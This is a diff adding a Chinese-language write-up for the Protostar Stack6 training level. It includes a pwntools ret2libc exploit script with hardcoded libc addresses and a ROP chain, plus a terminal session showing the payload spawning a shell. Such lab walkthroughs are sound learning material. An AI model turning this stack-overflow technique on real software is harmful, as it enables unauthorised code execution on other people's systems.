@@ -205,3 +205,38 @@ main()
 
 要拿root权限，还需要跑/opt/protostar/bin/stack5这个路径下的文件，不过因为文件夹对user用户有写限制，
 所以core dump不好生成，可在root权限下生成core dump进行分析
+
+##Stack6
+
+现学了pwntools的使用，用它的ROP包搞定吧，虽然这里只有ret2libc。
+
+```python
+from pwn import *
+
+system = 0x4005cfb0     #GDB里print system查到的,也可以objdump -T *来计算到
+cmd = 0x80482a8 + 12    #LIBC_2.0,objdump-s *找到的，可随便找一字符串,需要本地写一个文件
+
+s6 = ELF("stack6")
+r6 = ROP(s6)
+r6.call(system, [cmd])
+
+shellcode = ""
+shellcode += "A"*0x4c +"B"*4
+shellcode += r6.chain()
+
+fd = open("shellcode6", "w")
+fd.write(shellcode)
+fd.close()
+```
+
+```
+user@protostar:/tmp$ cat shellcode6 -|./stack6
+input path please: 
+got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@AAAAAAAABBBB�@ﾭ޴�
+whoami
+user
+pwd
+/tmp
+```
+
+Done！
